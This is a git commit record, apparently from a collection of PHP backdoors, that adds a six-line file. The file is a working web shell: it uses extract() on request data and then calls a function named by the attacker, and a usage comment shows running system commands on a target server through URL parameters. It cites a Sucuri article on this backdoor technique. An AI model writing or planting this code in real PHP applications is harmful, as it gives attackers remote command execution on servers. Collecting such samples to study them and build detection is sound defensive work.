550b10cfb1f31eaffc251b17713907dec5c99fb2
Sitakom Blog <destroy.sm92@gmail.com>
2018-06-01 06:58:44 +0700

    Create php-bd-extract-function.php

---
+++ php-bd-extract-function.php
@@ -0,0 +1,6 @@
+<?php
+@extract($_REQUEST);
+echo($a($b));
+//Usage : http://targeturi.com/test.php?a=system&b=pwd
+//https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html
+?>
